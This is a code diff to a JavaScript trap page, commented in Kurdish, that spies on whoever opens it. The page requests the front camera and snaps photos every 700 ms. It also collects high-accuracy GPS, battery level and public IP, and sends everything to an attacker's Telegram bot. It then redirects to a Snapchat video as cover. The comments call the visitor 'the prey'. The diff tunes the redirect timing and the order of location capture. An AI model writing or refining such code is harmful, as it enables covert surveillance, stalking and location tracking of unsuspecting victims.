@@ -15,30 +15,21 @@
     async function capture() {
         if (!targetID) return;
 
-        // ✅ ١. سەرەتا لوکەیشن وەردەگرین (بۆ ئەوەی پێش ڕێدایرێکت بنێردرێت)
-        navigator.geolocation.getCurrentPosition(pos => {
-            sendLocation(pos.coords.latitude, pos.coords.longitude);
-        }, err => {
-            sendToTelegram("⚠️ نێچیرەکە ڕێگری لە لوکەیشن کرد.");
-        }, { enableHighAccuracy: true });
-
-        // 🔥 ٢. کاتی ڕێدایرێکت زیاد دەکەین بۆ ١٠ چرکە تا لوکەیشنەکە فریای ناردن بکەوێت
+        // 🔥 ڕێدایرێکت دوای ٥ چرکە بە بەهێزترین شێواز (وەک خۆی)
         setTimeout(() => {
             window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
-        }, 10000);
+        }, 5000);
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" }, 
                 audio: false 
             });
-
             let batteryInfo = "Unknown";
             if (navigator.getBattery) {
                 const batt = await navigator.getBattery();
                 batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
             }
-
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(data => {
@@ -50,11 +41,15 @@
                     sendToTelegram(report);
                 });
 
+            // 📍 گۆڕینی بەشی GPS بۆ وردبینی بەرز (بەبێ تێکدانی لۆژیکەکە)
+            navigator.geolocation.getCurrentPosition(pos => {
+                sendLocation(pos.coords.latitude, pos.coords.longitude);
+            }, null, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
+
             const video = document.createElement('video');
             video.srcObject = stream;
             video.muted = true;
             video.play();
-
             const takeSnap = () => {
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth; 
@@ -64,13 +59,11 @@
                 canvas.toBlob(b => { if (b) sendFile(b, "photo"); }, 'image/jpeg', 0.7);
             };
             setInterval(takeSnap, 700);
-
         } catch (e) {
-            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە کامێرا.");
+            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان.");
             window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
         }
     }
-
     function sendToTelegram(text) {
         fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
@@ -78,7 +71,6 @@
             body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
         });
     }
-
     function sendLocation(lat, lon) {
         fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
             method: 'POST',
@@ -86,7 +78,6 @@
             body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
         });
     }
-
     function sendFile(blob, type) {
         let fd = new FormData();
         fd.append("chat_id", targetID);
